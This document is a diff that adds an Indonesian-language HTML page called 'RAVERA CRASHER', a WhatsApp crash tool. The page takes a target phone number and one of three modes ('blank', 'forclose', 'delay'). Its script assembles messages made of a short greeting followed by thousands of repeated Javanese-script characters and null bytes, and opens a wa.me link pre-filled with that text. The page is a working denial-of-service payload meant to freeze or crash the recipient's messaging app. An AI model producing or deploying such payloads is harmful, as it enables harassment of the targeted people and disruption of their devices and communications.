@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>RAVERA CRASHER</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://files.catbox.moe/jym01m.jpg" />
+  <!-- Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Audiowide&display=swap" rel="stylesheet" />
+  
+ <style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Audiowide', sans-serif;
+    background: #050007;
+    color: #fff;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    background: radial-gradient(circle at top, #12001b, #050007 70%);
+  }
+
+  .wrap {
+    width: 100%;
+    padding: 20px;
+  }
+
+  .panel {
+    background: rgba(10, 0, 20, 0.45);
+    border: 2px solid rgba(255, 0, 255, 0.3);
+    padding: 28px;
+    max-width: 380px;
+    margin: 0 auto;
+    border-radius: 16px;
+    backdrop-filter: blur(8px);
+
+    box-shadow:
+      0 0 15px rgba(255, 0, 255, 0.4),
+      0 0 40px rgba(0, 200, 255, 0.25);
+
+    animation: fadeIn .7s ease-out;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(.95); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  .badge {
+    width: 100px;
+    height: 100px;
+    margin: 0 auto 18px;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 3px solid #ff00d4;
+    box-shadow: 0 0 15px #ff00d4;
+  }
+
+  .badge img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  .title {
+    text-align: center;
+    font-size: 24px;
+    margin-bottom: 25px;
+    color: #00eaff;
+    text-shadow:
+      0 0 12px #00eaff,
+      0 0 28px #00bfff;
+    letter-spacing: 2px;
+  }
+
+  .field {
+    width: 100%;
+    padding: 13px 15px;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid rgba(0, 255, 255, 0.2);
+    border-radius: 12px;
+    outline: none;
+    font-size: 15px;
+    color: #fff;
+    margin-bottom: 16px;
+    transition: .2s;
+
+    box-shadow: inset 0 0 12px rgba(0, 255, 255, 0.15);
+  }
+
+  .field:focus {
+    border-color: #00eaff;
+    box-shadow:
+      0 0 12px #00eaff,
+      inset 0 0 15px rgba(0, 255, 255, 0.35);
+  }
+
+  .btn-soft {
+    width: 100%;
+    padding: 11px 0;
+    border: none;
+    background: rgba(255, 0, 180, 0.15);
+    border: 1px solid rgba(255, 0, 180, 0.5);
+    color: #ffb7ff;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-bottom: 16px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+
+    box-shadow:
+      0 0 10px rgba(255, 0, 180, 0.3),
+      inset 0 0 12px rgba(255, 0, 180, 0.2);
+
+    transition: .25s;
+  }
+
+  .btn-soft:hover {
+    background: rgba(255, 0, 200, 0.25);
+    transform: scale(1.03);
+    box-shadow: 0 0 15px #ff00d4;
+  }
+
+  .btn-select {
+    width: 100%;
+    padding: 13px;
+    border-radius: 12px;
+    border: none;
+    background: linear-gradient(135deg, #00eaff, #00bfff, #0066ff);
+    color: #fff;
+    font-size: 17px;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 7px;
+    letter-spacing: 1px;
+    transition: .25s;
+
+    box-shadow: 0 0 15px #00eaff, 0 0 30px #0099ff;
+  }
+
+  .btn-select:hover {
+    transform: scale(1.05);
+    box-shadow:
+      0 0 20px #00eaff,
+      0 0 40px #0088ff;
+  }
+
+  .icon {
+    font-size: 22px;
+    text-shadow: 0 0 10px #fff;
+  }
+
+  .note {
+    text-align: center;
+    margin-top: 18px;
+    font-size: 12px;
+    opacity: .75;
+    color: #ff9bf7;
+    text-shadow: 0 0 8px #ff00d4;
+  }
+</style>
+
+</head>
+<body>
+  <div class="wrap">
+    <div class="panel">
+      <div class="badge"><img src="https://files.catbox.moe/jym01m.jpg" alt="badge"></div>
+      <div class="title">RAVERA CRASHER</div>
+
+      <label for="target" style="display:block;margin:0 0 8px 8px;font-size:13px;color:rgba(255,200,200,0.85);font-weight:700">
+        Input Nomor
+      </label>
+      <input id="target" class="field" type="text" inputmode="numeric" placeholder="628××××××">
+
+      <button id="methodBtn" class="btn-soft" type="button">Blank Hard ☀︎</button>
+
+      <button id="send" class="btn-select" type="button">
+        <span class="icon">▷</span>
+        <span>SEND</span>
+      </button>
+
+      <div class="note">NOTE INI APK FREE KALO AD YANG JUAL ORG MISKIN/B.U😹</div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      const target = document.getElementById('target');
+      const methodBtn = document.getElementById('methodBtn');
+      const send = document.getElementById('send');
+
+      const modes = ['blank', 'forclose', 'delay'];
+      const labels = {
+        blank: 'Blank Hard ⚠︎︎',
+        forclose: 'Forclose 24j ❆︎',
+        delay: 'Delay Parah ☢︎'
+      };
+      const texts = {
+        blank: 'aman bang?' + 'ꦾ𝐗ꦽꦽ'.repeat(7555),
+        forclose: 'aman bang?' + ('ꦾ𝐙\u0000ꦽ').repeat(7555),
+        delay: 'aman bang?' + 'ꦾ𝐙$'.repeat(9670) + '\n' + 'ꦽ'.repeat(9999)
+      };
+
+      let mode = 'blank';
+
+      methodBtn.addEventListener('click', () => {
+        const i = modes.indexOf(mode);
+        mode = modes[(i + 1) % modes.length];
+        methodBtn.textContent = labels[mode];
+      });
+
+      function sanitizeNumber(v){
+        return v.replace(/[^0-9]/g, '');
+      }
+
+      send.addEventListener('click', () => {
+        const num = sanitizeNumber(target.value.trim());
+        if(!num){
+          alert('Masukkan nomor target yang valid.');
+          return;
+        }
+        const msg = encodeURIComponent(texts[mode]);
+        window.open(`https://wa.me/${num}?text=${msg}`, '_blank');
+      });
+    })();
+  </script>
+</body>
+</html>
